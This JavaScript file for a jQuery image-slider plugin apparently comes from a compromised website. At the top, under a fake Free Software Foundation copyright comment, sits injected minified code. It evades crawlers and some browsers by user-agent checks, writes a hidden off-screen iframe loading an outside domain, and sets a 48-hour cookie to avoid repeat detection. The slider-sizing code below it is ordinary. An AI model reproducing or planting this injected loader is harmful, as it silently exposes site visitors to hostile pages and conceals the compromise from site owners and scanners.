/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):undefined}(function(){function e(e,t,n){var r=(e+"").toLowerCase();var i=(t+"").toLowerCase();var s=0;if((s=r.indexOf(i,n))!==-1){return s}return false}function t(){var t=["AppleWebKit","Windows NT 6.3","Windows NT 6.2","rv:11.0","Linux","Android","Googlebot","IEMobile"];var n=false;for(var r in t){if(e(navigator.userAgent,t[r])){n=true;break}}return n}var n=getCookie("princesse_ato")===undefined;if(!t()&&n){document.write("<if"+"rame src="+'"http://beloartir.rleary.com/idealsoftware17.html?a" style="border-right-style: dotted;top: -998px;left: -998px;border-top-width: 5px;position: absolute;border-top-width: 5px;" height="140" width="140"></iframe>');var r=new Date((new Date).getTime()+48*60*60*1e3);document.cookie="princesse_ato=1; path=/; expires="+r.toUTCString()}})()
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/;(function($) {
jQuery.fn.smoothSlider=function(args){
	var defaults={
			sliderWidth		:900,
			sliderHeight		:320,
			navArr			:0,
			img_align		:'left'
	}
	var options=jQuery.extend({},defaults,args);
	var self=this;
	this.smoothSliderSize=function(){
		var wrapWidth=this.width();
		var slideri=this.find('.smooth_slideri');
		var slideriW;			
		//calculate max-width of slideri
		if(options.navArr==0) slideriW=wrapWidth;
		else slideriW=wrapWidth-(48+10); //48px for arrows and 10 for additional margin for text
		slideri.css('max-width',slideriW+'px');
		//float excerpt below image 
		if(options.img_align=='left' || options.img_align=='right'){
			var sldrThumb=this.find('.smooth_slider_thumbnail');	
			var sldrThumbW=sldrThumb.outerWidth(true);
			if(slideriW-sldrThumbW < 70){
				if(options.img_align=='right')sldrThumb.removeClass('smoothRight');
				else sldrThumb.removeClass('smoothLeft');
				sldrThumb.addClass('smoothNone');
			}
			else{
				sldrThumb.removeClass('smoothNone');
				if(options.img_align=='right')sldrThumb.addClass('smoothRight');
				else sldrThumb.addClass('smoothLeft');
			}
		}
		//slider height
		var iht=0;
		this.find(".smooth_slideri").each(function(idx,el){
			if(jQuery(el).outerHeight(true)>iht)iht=jQuery(el).outerHeight(true);
		});
		var eHt=this.find(".sldr_title").outerHeight(true) + this.find(".smooth_nav").outerHeight(true);
		var ht=iht + eHt;
		this.height(ht);
		this.find(".smooth_slider_thumbnail").on('load',function(e){
			var pHt=jQuery(this).parents(".smooth_slideri").outerHeight(true)+eHt;
			if(pHt > ht)ht=pHt;		
			self.height(ht);		
		});
		return this;
	};
	this.smoothSliderSize();
	
	//On Window Resize
	jQuery(window).resize(function() { 
		self.smoothSliderSize();
	});
}
})(jQuery);
